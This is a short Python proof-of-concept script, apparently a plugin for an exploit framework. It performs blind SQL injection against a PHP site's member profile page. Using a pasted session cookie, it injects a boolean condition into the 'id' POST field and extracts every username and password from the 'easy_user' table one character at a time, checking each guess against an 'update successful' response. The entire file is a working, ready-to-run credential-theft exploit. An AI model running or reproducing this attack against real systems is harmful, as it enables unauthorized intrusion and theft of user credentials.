import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("index.php"):
            print("[*] Please make sure the url end with 'index.php'")
            exit()
        cookie = raw_input("[*] Please paste the cookie:").split(';')
        cookies = {}
        for i in range(0, len(cookie)):
            name, value = cookie[i].strip().split('=', 1)
            cookies[name] = value
        url = target.url + "?s=/member/person/Profile.html"

        index = [i for i in range(32, 127)]
        index += [0]

        result = ""
        j = 1
        while j:
            for i in range(len(index)):
                header = {"Content-Type": "application/x-www-form-urlencoded"}
                postData = "id=1 and ascii(substr(((SELECT GROUP_CONCAT(username,0x20,password) FROM easy_user))," + str(
                    j) + ",1))%3d" + str(
                        index[i]) + "&email=test%40test.com&sex=" + str(
                            i + 100)
                r = requests.post(
                    url, headers=header, data=postData, cookies=cookies)

                if "\u66f4\u65b0\u6210\u529f".decode(
                        'unicode_escape') in r.text:
                    if index[i]:
                        result += chr(index[i])
                        j = j + 1
                        print("[*] Sql injecting: " + result)
                    else:

                        print("[*] Get the username and password: " + result)
                        j = 0
                        break
    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
